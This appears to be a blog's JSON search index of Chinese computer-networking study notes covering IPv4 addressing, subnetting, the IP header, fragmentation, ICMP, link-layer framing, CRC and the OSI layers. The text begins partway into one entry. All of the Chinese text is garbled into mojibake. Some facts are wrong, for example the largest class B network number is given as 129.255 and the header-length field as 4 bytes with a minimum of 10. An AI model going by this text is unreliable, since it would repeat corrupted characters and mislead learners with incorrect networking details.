ç›®çš„ä¸»æœºçš„å®Œæ•´åœ°å€éœ€è¦æ—¶åˆ»æºå¸¦      å¯èƒ½å‡ºç°ä¼ è¾“å·®é”™ï¼Œä½†é€ ä»·ä½å»‰ï¼Œé€‚åº”æ€§å¼º        å°†å¤æ‚ç½‘ç»œå¤„ç†åŠŸèƒ½è‡³äºå› ç‰¹ç½‘è¾¹ç¼˜ï¼ˆç”¨æˆ·ä¸»æœºå’Œå…¶å†…éƒ¨çš„è¿è¾“å±‚ï¼‰  IPv4â€‹\tæ¯ä¸€å°ä¸»æœºï¼ˆæˆ–è·¯ç”±å™¨ï¼‰çš„æ¯ä¸ªæ¥å£ï¼Œåˆ†é…å”¯ä¸€çš„32bitçš„è¯†åˆ«ç¬¦â€‹\tç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤ºæ³•ï¼Œæ¯8ä½åˆ†ä¸ºä¸€ç»„åˆ†ç±»ç¼–å€æ–¹å¼  Aç±»åœ°å€ï¼š8ä½ï¼ˆç½‘ç»œå·ï¼‰+ 24ä½ï¼ˆä¸»æœºå·ï¼‰          ç½‘ç»œå·ç¬¬ä¸€ä¸ªæ¯”ç‰¹å€¼ä¸€å®šä¸º0      æœ€å°ç½‘ç»œå·0ï¼Œä¿ç•™ä¸æŒ‡æ´¾                  0.0.0.0æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ç½‘ç»œåœ°å€ï¼Œè¡¨ç¤ºâ€œåœ¨æœ¬ç½‘ç»œä¸Šçš„æœ¬ä¸»æœºâ€ï¼Œåªèƒ½ä½œä¸ºæºåœ°å€ä½¿ç”¨                    æœ€å¤§ç½‘ç»œå·127ï¼Œä½œä¸ºæœ¬åœ°ç¯å›æµ‹è¯•åœ°å€ï¼Œä¸æŒ‡æ´¾                  æœ€å°çš„ï¼š127.0.0.1          æœ€å¤§çš„ï¼š127.255.255.254                    å¯æŒ‡æ´¾çš„ç½‘ç»œåœ°å€1.0.0.0 - 126.0.0.0        Bç±»åœ°å€ï¼š16ä½ï¼ˆç½‘ç»œå·ï¼‰+ 16ä½ï¼ˆä¸»æœºå·ï¼‰          ç½‘ç»œå·ç¬¬ä¸€äºŒä¸ªæ¯”ç‰¹å€¼ä¸€å®šä¸º10      æœ€å°ç½‘ç»œå·ï¼Œä¹Ÿæ˜¯ç¬¬ä¸€ä¸ªå¯æŒ‡æ´¾çš„ç½‘ç»œå· 128.0      æœ€å¤§ç½‘ç»œå·ï¼Œä¹Ÿæ˜¯æœ€åä¸€ä¸ªå¯æŒ‡æ´¾çš„ç½‘ç»œå· 129.255      å¯æŒ‡æ´¾çš„ç½‘ç»œåœ°å€ï¼š128.0.0.0 - 191.255.0.0        Cç±»åœ°å€ï¼š24ä½ï¼ˆç½‘ç»œå·ï¼‰+ 8ä½ï¼ˆä¸»æœºå·ï¼‰          ç½‘ç»œå·ç¬¬ä¸€äºŒä¸‰ä¸ªæ¯”ç‰¹å€¼ä¸€å®šä¸º110      æœ€å°çš„ç½‘ç»œå·ï¼Œä¹Ÿæ˜¯ç¬¬ä¸€ä¸ªå¯æŒ‡æ´¾çš„ç½‘ç»œå· 192.0.0      æœ€å¤§çš„ç½‘ç»œå·ï¼Œä¹Ÿæ˜¯æœ€åä¸€ä¸ªå¯æŒ‡æ´¾çš„ç½‘ç»œå· 223.255.255      å¯æŒ‡æ´¾çš„ç½‘ç»œåœ°å€ï¼š192.0.0.0 - 223.255.255.0        Dç±»åœ°å€ï¼šå¤šæ’­åœ°å€  Eç±»åœ°å€ï¼šä¿ç•™ä»Šåä½¿ç”¨  å¹¿æ’­åœ°å€ï¼š255.255.255.255ï¼Œè¡¨ç¤ºâ€œåªåœ¨æœ¬ç½‘ç»œè¿›è¡Œå¹¿æ’­â€ï¼Œåªèƒ½ä½œä¸ºç›®çš„åœ°å€ä½¿ç”¨å­ç½‘åˆ’åˆ†      ä¸ºä»€ä¹ˆè¦åˆ’åˆ†å­ç½‘ï¼š          ç”³è¯·æ›´å¤šçš„IPåœ°å€ï¼Œä¼šå¯¼è‡´è·¯ç”±è¡¨è®°å½•æ•°é‡æ€å¤š      æµªè´¹åŸæœ‰ç½‘ç»œä¸­å‰©ä½™çš„IPåœ°å€            å­ç½‘åœ°å€è®¡ç®—    ã€ä¾‹é¢˜ã€‘ç½‘ç»œåœ°å€ä¸º218.75.230.0ï¼Œä½¿ç”¨å­ç½‘æ©ç 255.255.255.128å¯¹å…¶å­ç½‘åˆ’åˆ†ã€‚                  218.75.230.0ï¼šè¯¥ç½‘ç»œä¸ºCç±»ç½‘ç»œåœ°å€ï¼Œå‰ä¸‰ä¸ªå€¼ä¸ºç½‘ç»œå·ï¼Œæœ€åä¸€ä½æ˜¯ä¸»æœºå·                    255.255.255.128ï¼š                  å‰ä¸‰ä¸ª255è¡¨ç¤ºè¿ç»­24ä¸ªæ¯”ç‰¹1ï¼Œå¯¹åº”äº†ç½‘ç»œå·éƒ¨åˆ†ï¼Œ                            128åŒ–ä¸ºäºŒè¿›åˆ¶è¡¨ç¤ºä¸€ä¸ªæ¯”ç‰¹1ï¼Œå³ä»ä¸»æœºå·ä¸­å€Ÿç”¨äº†ä¸€ä¸ªæ¯”ç‰¹ä½œä¸ºå­ç½‘å·                  åˆ’åˆ†çš„å­ç½‘æ•°é‡ 2^1 = 2ï¼Œæ¯ä¸ªå­ç½‘å¯åˆ†é…çš„åœ°å€æ•°é‡2^ï¼ˆ8-1 ) - 2=126    [å»æ‰ä¸»æœºå·å…¨ä¸º0çš„ç½‘ç»œåœ°å€ã€å…¨ä¸º1çš„å¹¿æ’­åœ°å€]        é»˜è®¤å­ç½‘    åœ¨æœªåˆ’åˆ†å­ç½‘çš„æƒ…å†µä¸‹ä½¿ç”¨å­ç½‘æ©ç     ç½‘ç»œå·å¯¹åº”æ©ç å…¨ä¸º1ï¼Œä¸»æœºå·çš„å¯¹åº”æ©ç å…¨ä¸º0  æŠ¥æ–‡é¦–éƒ¨æ ¼å¼é¦–éƒ¨é•¿åº¦ï¼š4ä¸ªå­—èŠ‚  æœ€å¤§å€¼ä¸º15ï¼šå›ºå®šéƒ¨åˆ† 20å­—èŠ‚ + å¯å˜éƒ¨åˆ† 40å­—èŠ‚  æœ€å°å€¼ä¸º10ï¼šå›ºå®šéƒ¨åˆ† 20å­—èŠ‚      IPæ•°æ®æŠ¥çš„é¦–éƒ¨é•¿åº¦ä¸€å®šæ˜¯4çš„æ•´æ•°å€    åŒºåˆ†æœåŠ¡          8bitï¼Œä¸€èˆ¬ä¸ä½¿ç”¨      è¯¥å­—æ®µçš„ä¸åŒæ•°å€¼å¯æä¾›ä¸åŒç­‰çº§çš„æœåŠ¡è´¨é‡            æ€»é•¿åº¦          é¦–éƒ¨é•¿åº¦ + æ•°æ®è½½è·            ã€æ ‡è¯† + æ ‡å¿— + ç‰‡åç§»ï¼šIPæ•°æ®æŠ¥åˆ†ç‰‡ã€‘        ç”Ÿå­˜æ—¶é—´ï¼šé˜²æ­¢æ•°æ®æŠ¥åœ¨ç½‘ç»œä¸­å…œåœˆ â€“ è·¯ç”±ç¯è·¯          ä»¥â€œæ—¶é—´â€ä¸ºè®¡æ•°ï¼Œåˆå§‹ - å½“å‰è·¯ç”±èŠ±è´¹çš„æ—¶é—´ = å‰©ä½™æ—¶é—´                  ï¼0ï¼Œè½¬å‘ï¼›â‰¤ 0ï¼Œä¸¢å¼ƒ                    ä»¥â€œè·³æ•°â€ä¸ºè®¡æ•°ï¼Œè·³è½¬æŒ‡å®šæ¬¡æ•°                  ï¼0ï¼Œè½¬å‘ï¼›â‰¤ 0ï¼Œä¸¢å¼ƒ                          åè®®                  8bitï¼Œæ•°æ®éƒ¨åˆ†æ˜¯ä½•ç§åè®®æ•°æ®å•å…ƒ                    å¸¸ç”¨åè®®ä¸å­—æ®µå€¼                      é¦–éƒ¨æ£€éªŒå’Œ          16bitï¼Œæ£€éªŒé¦–éƒ¨åœ¨ä¼ è¾“è¿‡ç¨‹æ˜¯å¦å‡ºç°å·®é”™      IPå±‚æœ¬èº«ä¸æä¾›å¯é ä¼ è¾“æœåŠ¡ï¼Œå› è€ŒIPv6å°†ä¸å†è¿›è¡Œæ ¡éªŒ        æºIPåœ°å€å’Œç›®çš„IPåœ°å€ï¼Œå„å 32bitåˆ†ç‰‡æ–¹å¼  ä¸ºä»€ä¹ˆè¦åˆ†ç‰‡ï¼š          IPæ•°æ®æŠ¥éœ€è¦æ‰“åŒ…æˆå¸§ï¼Œè€Œå¸§é•¿åº¦å—é™äºçš„æœ€å¤§ä¼ è¾“å•ä½MTU      å½“IPæ•°æ®æŠ¥é•¿åº¦ &gt; å¸§ï¼Œéœ€è¦ åˆ†ç‰‡ æˆæ›´å°çš„æ•°æ®æŠ¥æ–‡        æ ‡è¯†ï¼š          16bit      åŒä¸€ä¸ªæ•°æ®æŠ¥çš„å„åˆ†ç‰‡åº”è¯¥å…·æœ‰ç›¸åŒçš„æ ‡è¯†      IPè½¯ä»¶ç»´æŒä¸€ä¸ªè®¡æ•°å™¨ï¼Œæ¯äº§ç”Ÿä¸€ä¸ªæ•°æ®æŠ¥è®¡æ•°å™¨+1ï¼Œèµ‹å€¼ç»™æ ‡è¯†å­—æ®µ        æ ‡å¿—          3bit      DFä½ï¼šï¼ˆDonâ€™t åˆ†ç‰‡ï¼Ÿï¼‰                  1 â€“ ä¸å…è®¸åˆ†ç‰‡          0 â€“ å…è®¸åˆ†ç‰‡                    MFä¸ºï¼šï¼ˆMore åˆ†ç‰‡?ï¼‰                  1 â€“ åé¢è¿˜æœ‰åˆ†ç‰‡          0 â€“ è¿™æ˜¯æœ€åä¸€ä¸ªåˆ†ç‰‡                    ä¿ç•™ä½ï¼Œå¿…é¡»è®¾ç½®ä¸º0        ç‰‡åç§»          13bit      åˆ†ç‰‡æ•°æ®æŠ¥çš„æ•°æ®è½½è·éƒ¨åˆ† åœ¨åŸæ•°æ®æŠ¥ä½ç½® åç§»å¤šå°‘ä¸ªä½ç½®      ä»¥8ä¸ªå­—èŠ‚ä¸ºå•ä½ â€“ æ•°æ®è½½è·çš„ç¬¬nä¸ªå­—ç¬¦ / 8 ï¼ˆå†æ¬¡åˆ†ç‰‡ï¼Œç¬¬néµå¾ªæœ€åˆçš„ä½ç½®ï¼‰      é€‰è·¯ï¼ŸICMPâ€‹\tä¸ºæé«˜IPæ•°æ®æŠ¥ è½¬å‘å’Œäº¤ä»˜æˆåŠŸçš„æ¦‚ç‡ï¼Œåœ¨ç½‘é™…å±‚ä½¿ç”¨ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®Internet control message protocolâ€‹\tè¢«å°è£…åœ¨IPæ•°æ®æŠ¥ä¸­å‘é€â€‹\tåº”ç”¨åœºæ™¯ï¼š  åˆ†ç»„ç½‘é—´æ¢æµ‹PING          æµ‹è¯•ä¸»æœºé—´çš„è¿é€šæ€§      åº”ç”¨å±‚ç›´æ¥ä½¿ç”¨ç½‘é™…å±‚çš„ICMPï¼ˆè€Œä¸tonè¿‡è¿è¾“å±‚çš„TCPå’ŒUDPï¼‰      ä½¿ç”¨ICMPçš„å›é€è¯·æ±‚å’Œå›ç­”è¯·æ±‚        è·Ÿè¸ªè·¯ç”±          æµ‹è¯•IPæ•°æ®æŠ¥ç»è¿‡å“ªäº›è·¯ç”±ä¼ é€’      Windowsç³»ç»Ÿ                  tracectå‘½ä»¤          åº”ç”¨å±‚ç›´æ¥åªç”¨ç½‘é™…å±‚ICMP          ICMPå›é€è¯·æ±‚ã€å›ç­”æŠ¥æ–‡ã€å·®é”™æŠ¥æ–‡                    Unixç‰ˆæœ¬                  tracerouteå‘½ä»¤          åœ¨è¿è¾“å±‚ä½¿ç”¨UDPåè®®          åªä½¿ç”¨äº†å·®é”™æŠ¥æ–‡                    æŸ¥è¯¢æŠ¥æ–‡2ç§  å›é€è¯·æ±‚å’Œå›ç­”ï¼š          è¯·æ±‚æŠ¥æ–‡ï¼šå‘ç‰¹å®šä¸»æœºå‘å‡ºè¯¢é—®      å›ç­”æŠ¥æ–‡ï¼šæ”¶åˆ°è¯·æ±‚çš„ä¸»æœºå¿…é¡»å›å¤      æµ‹è¯•ç›®çš„ç«™æ˜¯å¦å¯è¾¾+çŠ¶æ€        æ—¶é—´æˆ³è¯·æ±‚å’Œå›ç­”          è¯·ä¸»æœºå›ç­”å½“å‰çš„æ—¥æœŸå’Œæ—¶é—´      æ—¶é’ŸåŒæ­¥å’Œæµ‹é‡æ—¶é—´      å·®é”™æŠ¥æ–‡5ç§  ç»ˆç‚¹ä¸å¯è¾¾ï¼šç›®çš„ä¸»æœºã€è·¯ç”±ä¸èƒ½äº¤ä»˜æ•°æ®æŠ¥  æºç‚¹æŠ‘åˆ¶ï¼šç›®çš„æ‹¥å¡è€Œä¸¢å¼ƒæŠ¥æ–‡ï¼Œé€šçŸ¥æºç‚¹æ•°æ®å‘é€é€Ÿç‡æ”¾æ…¢  æ—¶é—´è¶…è¿‡ï¼š          è·¯ç”±å› TTL &lt; 0è€Œä¸¢å¼ƒæŠ¥æ–‡æ—¶ï¼Œè¦é€šçŸ¥æºç‚¹      è§„å®šæ—¶é—´å†…æ²¡æœ‰æ”¶åˆ°ä¸€ä¸ªæŠ¥æ–‡çš„å…¨éƒ¨æŠ¥ç‰‡ï¼Œä¼šå°†å·²æ”¶åˆ°çš„å…¨éƒ¨ä¸¢å¼ƒï¼Œå¹¶é€šçŸ¥æºç‚¹        å‚æ•°é—®é¢˜ï¼šé¦–éƒ¨æ£€éªŒä¸å­—æ®µå‘ç°ä¼ è¾“ä¸­å‡ºç°è¯¯ç ï¼Œä¸¢å¼ƒä¸”é€šçŸ¥æºç‚¹  æ”¹å˜è·¯ç”±ï¼ˆé‡å®šå‘ï¼‰ï¼šè·¯ç”±è·¯å¾„æœ‰æ›´ä¼˜è§£æ—¶ä¸å¯å‘é€å·®é”™æŠ¥æ–‡çš„æƒ…å†µï¼š  å¯¹ICMPå·®é”™æŠ¥æ–‡ ä¸å†å‘é€ å·®é”™æŠ¥æ–‡          å¯¹ç¬¬ä¸€ä¸ªåˆ†ç‰‡çš„æ•°æ®æŠ¥ç‰‡çš„æ‰€æœ‰åç»­æ•°æ®æŠ¥ç‰‡ éƒ½ä¸å†å‘é€å·®é”™æŠ¥æ–‡      å¯¹å…·æœ‰å¤šæ’­åœ°å€çš„æ•°æ®æŠ¥ éƒ½ä¸å‘é€ICMPå·®é”™æŠ¥æ–‡      å¯¹ç‰¹æ®Šåœ°å€çš„æ•°æ®æŠ¥ ä¸å‘é€å·®é”™æŠ¥æ–‡      ARPï¼Ÿ"
  },
  
  {
    "title": "3. é“¾è·¯å±‚",
    "url": "/posts/3.%E9%93%BE%E8%B7%AF%E5%B1%82/",
    "categories": "è®¡ç®—æœºç½‘ç»œ",
    "tags": "computerNetwork",
    "date": "2022-06-13 00:00:00 +0800",
    





    
    "snippet": "é“¾è·¯å±‚  é“¾è·¯ï¼ˆLinkï¼‰ï¼šä¸¤ä¸ªç»“ç‚¹é—´çš„ç‰©ç†çº¿è·¯  æ•°æ®é“¾è·¯ï¼šæŠŠå®ç°é€šä¿¡åè®®çš„ç¡¬ä»¶å’Œè½¯ä»¶ï¼ŒåŠ åˆ°é“¾è·¯ä¸Š  å°è£…æˆå¸§ï¼šåŠ ä¸Šå¸§å¤´ å¸§å°¾  å·®é”™æ£€æµ‹ï¼šå¸§å°¾çš„æ£€éªŒç   å¯é ä¼ è¾“ï¼šæ¥æ”¶æ–¹å‘ç°å¸§éªŒè¯é”™è¯¯ï¼Œä¸¢å¼ƒè¯¥å¸§è€Œä¸æ¥å—å¹¿æ’­é€šé“é“¾è·¯ï¼šå°†ç›®æ ‡åœ°å€ã€æºåœ°å€å†™å…¥å¸§å¤´å…±äº«å¼å±€åŸŸç½‘ä¿¡å·ç¢°æ’é—®é¢˜ï¼šæ¥å…¥æ§åˆ¶åè®® CSMA/CDå°è£…æˆå¸§            1å­—èŠ‚      1å­—èŠ‚      1å­—èŠ‚      2å­—èŠ‚ ...",
    "content": "é“¾è·¯å±‚  é“¾è·¯ï¼ˆLinkï¼‰ï¼šä¸¤ä¸ªç»“ç‚¹é—´çš„ç‰©ç†çº¿è·¯  æ•°æ®é“¾è·¯ï¼šæŠŠå®ç°é€šä¿¡åè®®çš„ç¡¬ä»¶å’Œè½¯ä»¶ï¼ŒåŠ åˆ°é“¾è·¯ä¸Š  å°è£…æˆå¸§ï¼šåŠ ä¸Šå¸§å¤´ å¸§å°¾  å·®é”™æ£€æµ‹ï¼šå¸§å°¾çš„æ£€éªŒç   å¯é ä¼ è¾“ï¼šæ¥æ”¶æ–¹å‘ç°å¸§éªŒè¯é”™è¯¯ï¼Œä¸¢å¼ƒè¯¥å¸§è€Œä¸æ¥å—å¹¿æ’­é€šé“é“¾è·¯ï¼šå°†ç›®æ ‡åœ°å€ã€æºåœ°å€å†™å…¥å¸§å¤´å…±äº«å¼å±€åŸŸç½‘ä¿¡å·ç¢°æ’é—®é¢˜ï¼šæ¥å…¥æ§åˆ¶åè®® CSMA/CDå°è£…æˆå¸§            1å­—èŠ‚      1å­—èŠ‚      1å­—èŠ‚      2å­—èŠ‚      &lt;1500å­—èŠ‚      2å­—èŠ‚      1å­—èŠ‚                  æ ‡å¿—ï¼ˆå¼€å§‹ï¼‰      åœ°å€      æ§åˆ¶      åè®®      æ•°æ®      FCS      æ ‡å¿—ï¼ˆç»“æŸï¼‰              å¸§å¤´      Â       Â       å¸§å¤´      Â       å¸§å°¾      å¸§å°¾        å¸§å®šç•Œï¼š          å¸§å¤´å¸§å°¾      MACæ²¡æœ‰å¸§å¤´å®šç•Œæ ‡å¿—ï¼Œç”¨ç‰©ç†å±‚çš„å‰å¯¼ç ä½œä¸ºå…¶å¸§å¼€å§‹æ ‡å¿—      å¸§é—´é—´éš”ï¼ˆ96biteå‘é€æ—¶é—´ï¼‰ä½œä¸ºæ ‡å¿—        é€æ˜ä¼ è¾“ï¼šæ•°æ®é“¾è·¯å±‚ å¯¹ä¸Šå±‚äº¤ä»˜çš„æ•°æ®æ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œå°±å¦‚åŒé€æ˜çš„ä¸€æ ·          å¸§ä¸­å‡ºç°æ•°æ®ä¸å®šç•Œç¬¦ä¸€è‡´ï¼Œå°†å¯¼è‡´æ¥æ”¶æ–¹è¯†åˆ«é”™è¯¯ä¿¡æ¯ï¼Œä¸èƒ½å®ç°é€æ˜      å‘é€å‰æ‰«æï¼Œå°†ç›¸ä¼¼çš„æ•°æ®æ·»åŠ è½¬ä¹‰ ã€é¢å‘å­—ç¬¦ç±»å‹ï¼š1å­—èŠ‚ï¼Œå€¼27ã€‘ã€é¢å‘æ¯”ç‰¹ç±»å‹ï¼šæ¯äº”ä¸ªæ¯”ç‰¹1æ’å…¥ä¸€ä¸ª0ã€‘        æœ€å¤§ä¼ è¾“å•å…ƒ MTUï¼Œæ•°æ®éƒ¨åˆ†åº”è¯¥å°½å¯èƒ½å¤§äº›ï¼Œä½†ä¸ºå·®é”™æ£€æŸ¥ç­‰æ•°æ®é“¾è·¯å±‚åŠŸèƒ½çš„ä¿è¯ï¼Œè®¾å®šçš„å€¼å·®é”™æ£€æµ‹  åŸºæœ¬æ¦‚å¿µï¼š          æ¯”ç‰¹å·®é”™ï¼šæ¯”ç‰¹åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­å¯èƒ½å‘ç”Ÿçš„å·®é”™ï¼Œ1â†’0,0â†’1      è¯¯ç ç‡ï¼ˆBERï¼Œbit error rateï¼‰= ä¼ è¾“é”™è¯¯çš„æ¯”ç‰¹ / æ€»æ¯”ç‰¹      ä½¿ç”¨é”™è¯¯æ£€æµ‹ç  æ£€éªŒæ˜¯å¦å‘ç”Ÿäº†é”™è¯¯        å¥‡å¶æ ¡éªŒ          ä½¿æ•´ä¸ªæ•°æ®ï¼ˆåŒ…æ‹¬æ£€éªŒä½ï¼‰ä¸­â€œ1â€çš„ä¸ªæ•°ä¸ºå¥‡æ•° / å¶æ•°ï¼›      å‡ºç°å¶ä¸ªæ•°è¯¯ç ï¼Œæ— æ³•æ£€å‡º        å¾ªç¯å†—ä½™æ ¡éªŒï¼ˆCRCï¼Œcyclic redundancy checkï¼‰          åŒæ–¹çº¦å®šçš„ç”Ÿæˆå¤šé¡¹å¼G(x)ï¼Œå¿…é¡»åŒ…å«æœ€ä½æ¬¡é¡¹      å‘é€æ–¹ï¼šè®¡ç®—å‡ºå†—ä½™ç ï¼Œæ·»åŠ åˆ°å¾…ä¼ è¾“æ•°æ®åé¢      æ¥æ”¶æ–¹ï¼šä½¿ç”¨å¤šé¡¹å¼è®¡ç®—æ•°æ®ï¼Œåˆ¤æ–­æ˜¯å¦äº§ç”Ÿè¯¯ç       æ¼æ£€ç‡æä½ï¼Œåªèƒ½æ£€æµ‹å‡ºå‘ç”Ÿå·®é”™ï¼Œè€Œä¸èƒ½å®šä½      G(x) = x^4 +x^2 +X^1 + 1  \t = 1*x^4 + 0*x^3 + 1x^2 + 1x^1 + 1*x^0\t = ç”Ÿæˆå¤šé¡¹å¼å„é¡¹ç³»æ•°æ„æˆçš„æ¯”ç‰¹ä¸²ï¼š10111å‘é€æ–¹ï¼š[ å¾…ä¼ è¾“æ•°æ®bit + G(x)æœ€é«˜æ¬¡ä¸ª0ï¼ˆ4ä¸ª0ï¼‰]Ã·ç”Ÿæˆå¤šé¡¹å¼å„é¡¹ç³»æ•°æ„æˆçš„æ¯”ç‰¹ä¸² = å•† Â·Â·Â·Â· ä½™æ•°å‘ç”Ÿçš„æ•°æ®ï¼šå¾…ä¼ è¾“æ•°æ®bit + è¡¥å…¨çš„ä½™æ•°æ¥æ”¶æ–¹ï¼š[ æ¥æ”¶æ•°æ® + ä½™æ•° ] Ã· ç”Ÿæˆå¤šé¡¹å¼å„é¡¹ç³»æ•°æ„æˆçš„æ¯”ç‰¹ä¸² = å•† Â·Â·Â·Â· 0 æ‰æ˜¯æ­£ç¡®çš„å¯é ä¼ è¾“æœåŠ¡â€‹\tå½“å‘ç”Ÿè¯¯ç æ—¶ï¼Œå¯¹å¸§çš„æ“ä½œï¼Œå–å†³äºå‘ä¸Šå±‚æä¾›çš„æœåŠ¡ç±»å‹ã€‚  ä¸å¯é ä¼ è¾“æœåŠ¡ï¼šä»…ä»…ä¸¢å¼ƒï¼ˆæœ‰çº¿é“¾è·¯ä¸­ä½¿ç”¨ï¼Œå‡ºç°è¯¯ç ç”±ä¸Šå±‚è´Ÿè´£ï¼‰  å¯é ä¼ è¾“æœåŠ¡ï¼šæ£€æµ‹åˆ°è¯¯ç å‘ç”Ÿçš„ä½ç½®ï¼ˆæ— çº¿é“¾è·¯å¿…é¡»æä¾›ï¼‰å…¶å®ƒå±‚çº§ä¹Ÿå¯ä½¿ç”¨å¯é ä¼ è¾“æœåŠ¡ä¸ä»…ä»…å±€é™äºæ•°æ®é“¾è·¯å±‚ï¼Œå…¶ä»–å±‚çº§ä¹Ÿå¯èƒ½å‡ºç°ä¼ è¾“å·®é”™            æ¯”ç‰¹å·®é”™      åˆ†ç»„ä¸¢å¤±      åˆ†ç»„å¤±åº      åˆ†ç»„é‡å¤                  æ•°æ®é“¾è·¯å±‚      Â       Â       Â       ç½‘ç»œå±‚ IPåè®®ï¼šæ— è¿æ¥ã€ä¸å¯é è¿è¾“å±‚ TCPåè®®ï¼šè¿æ¥ã€å¯é è¿è¾“å±‚ UDPåè®®ï¼šæ— è¿æ¥ã€ä¸å¯é å¯é ä¼ è¾“çš„å®ç°æœºåˆ¶â€‹\tã€ä¸‰ç§æ–¹å¼ï¼Œå¾…è¡¥å……ã€‘"
  },
  
  {
    "title": "2. è®¡ç®—æœºç½‘ç»œç”¨è¯­",
    "url": "/posts/2.%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD/",
    "categories": "è®¡ç®—æœºç½‘ç»œ",
    "tags": "computerNetwork",
    "date": "2022-06-12 00:00:00 +0800",
    





    
    "snippet": "ä¸“ä¸šæœ¯è¯­å®ä½“åè®®  æ§åˆ¶ä¸¤ä¸ªå¯¹ç­‰å®ä½“çš„é€»è¾‘é€šä¿¡è§„èŒƒçš„é›†åˆ  ä¸‰è¦ç´ ï¼šè¯­æ³•ã€è¯­ä¹‰ã€æ—¶åº",
    "content": "ä¸“ä¸šæœ¯è¯­å®ä½“åè®®  æ§åˆ¶ä¸¤ä¸ªå¯¹ç­‰å®ä½“çš„é€»è¾‘é€šä¿¡è§„èŒƒçš„é›†åˆ  ä¸‰è¦ç´ ï¼šè¯­æ³•ã€è¯­ä¹‰ã€æ—¶åº"
  },
  
  {
    "title": "1. è®¡ç®—æœºç½‘ç»œåˆ†å±‚",
    "url": "/posts/1.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%88%86%E5%B1%82/",
    "categories": "è®¡ç®—æœºç½‘ç»œ",
    "tags": "computerNetwork",
    "date": "2022-06-10 00:00:00 +0800",
    





    
    "snippet": "ç½‘ç»œåˆ†å±‚æ¨¡å‹OSIï¼šå¼€æ”¾å¼ç³»ç»Ÿäº’è”ã€ç‰©ç†é“¾è·¯å±‚ï¼šç‰©ç†å±‚+é“¾è·¯å±‚ â€“ Linkã€‘ã€å†…æ ¸æ€ã€‘  ç‰©ç†å±‚ï¼šbitï¼Œâ‘ ç‰©ç†æ¥å£ï¼Œâ‘¡æ€æ ·çš„ä¿¡å·è¡¨ç¤ºæ¯”ç‰¹  æ•°æ®é“¾è·¯å±‚ï¼šå¸§ï¼Œâ‘ æ ‡è¯†ä¸»æœºMACï¼Œâ‘¡è¯†åˆ«MACä¸æ•°æ®åœ°å€è®¿é—®åª’ä»‹ã€ç½‘ç»œå±‚ â€“ IP ICMP ARPã€‘ã€å†…æ ¸æ€ã€‘  ç½‘ç»œå±‚ï¼šåŒ…ï¼ŒIPåœ°å€è®¿é—®ã€ä¼ è¾“å±‚ â€“ TCP UDPã€‘ã€å†…æ ¸æ€ã€‘  ä¼ è¾“å±‚ï¼šæ®µï¼Œä¸åŒä¸»æœºç”¨æˆ·è¿›ç¨‹çš„æ•°æ®é€šä¿¡ã€åº”ç”¨å±‚ â€“ HTTP FT...",
    "content": "ç½‘ç»œåˆ†å±‚æ¨¡å‹OSIï¼šå¼€æ”¾å¼ç³»ç»Ÿäº’è”ã€ç‰©ç†é“¾è·¯å±‚ï¼šç‰©ç†å±‚+é“¾è·¯å±‚ â€“ Linkã€‘ã€å†…æ ¸æ€ã€‘  ç‰©ç†å±‚ï¼šbitï¼Œâ‘ ç‰©ç†æ¥å£ï¼Œâ‘¡æ€æ ·çš„ä¿¡å·è¡¨ç¤ºæ¯”ç‰¹  æ•°æ®é“¾è·¯å±‚ï¼šå¸§ï¼Œâ‘ æ ‡è¯†ä¸»æœºMACï¼Œâ‘¡è¯†åˆ«MACä¸æ•°æ®åœ°å€è®¿é—®åª’ä»‹ã€ç½‘ç»œå±‚ â€“ IP ICMP ARPã€‘ã€å†…æ ¸æ€ã€‘  ç½‘ç»œå±‚ï¼šåŒ…ï¼ŒIPåœ°å€è®¿é—®ã€ä¼ è¾“å±‚ â€“ TCP UDPã€‘ã€å†…æ ¸æ€ã€‘  ä¼ è¾“å±‚ï¼šæ®µï¼Œä¸åŒä¸»æœºç”¨æˆ·è¿›ç¨‹çš„æ•°æ®é€šä¿¡ã€åº”ç”¨å±‚ â€“ HTTP FTP DNS ..ã€‘ã€ç”¨æˆ·æ€ã€‘  ä¼šè¯å±‚ï¼šæ•°æ®ï¼Œåº”ç”¨ä¹‹é—´çš„é€šä¿¡æœºåˆ¶  è¡¨ç¤ºå±‚ï¼šæ•°æ®ï¼Œä¿¡æ¯è¯­æ³•é—®é¢˜  åº”ç”¨å±‚ï¼šæ•°æ®ï¼Œè¿›ç¨‹é—´é€šä¿¡ã€æä¾›ç½‘ç»œå’Œç”¨æˆ·åº”ç”¨å„å±‚ä¼ è¾“è®¾å¤‡ã€åº”ç”¨å±‚ -ï¼ˆç½‘å…³ï¼‰- ä¼ è¾“å±‚ - ç½‘ç»œå±‚ï¼ˆè·¯ç”±å™¨ï¼‰ - ï¼ˆäº¤æ¢æœºï¼‰ - æ•°æ®é“¾è·¯å±‚ï¼ˆç½‘æ¡¥ï¼‰ - ç‰©ç†å±‚ï¼ˆé›†çº¿å™¨ã€ä¸­ç»§å™¨ï¼‰ã€‘  ç½‘å…³ï¼š          å®ç°å¤æ‚ç½‘ç»œäº’è¿è®¾å¤‡      ä»…ç”¨äº é«˜å±‚åè®®ä¸åŒçš„ç½‘ç»œ äº’é€š      å¯ç”¨äºå¹¿åŸŸç½‘ï¼Œä¹Ÿå¯ç”¨äºå±€åŸŸç½‘        è·¯ç”±å™¨ï¼šè·¯ç”±é€‰æ‹©ã€å­˜å‚¨è½¬å‘ï¼›éš”ç¦»å†²çªåŸŸ+å¹¿æ’­åŸŸ  äº¤æ¢æœºï¼š          è¯†åˆ«MACåœ°å€ä¿¡æ¯ï¼Œå¹¶è¿›è¡Œè½¬å‘      ä¿å­˜ä¸€ä»½åœ°å€è¡¨ï¼ŒåŒ…æ‹¬ MACåœ°å€+ç«¯å£      éš”ç¦»å†²çªåŸŸï¼Œä¸éš”ç¦»å¹¿æ’­åŸŸ        ç½‘æ¡¥ï¼š          å°†ä¸¤ä¸ªLANè¿æ¥ï¼Œæ ¹æ®MACåœ°å€è½¬å‘ å¸§      éš”ç¦»å†²çªåŸŸï¼Œä¸éš”ç¦»å¹¿æ’­åŸŸ        é›†çº¿å™¨ï¼šçº¯ç¡¬ä»¶è®¾å¤‡ï¼Œè¿æ¥ç½‘ç»œç»ˆç«¯  